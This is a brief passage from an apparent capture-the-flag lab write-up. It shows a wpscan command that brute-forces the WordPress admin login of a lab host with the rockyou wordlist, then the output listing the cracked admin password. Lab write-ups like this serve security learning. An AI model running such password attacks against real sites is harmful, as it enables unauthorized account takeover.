we enumerated the user `admin` with wpscan. we can brute force for the password with this command:

`wpscan --url http://internal.thm/blog/wp-login.php -U admin --passwords /usr/share/wordlists/rockyou.txt`

we get the creds:

```bash
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```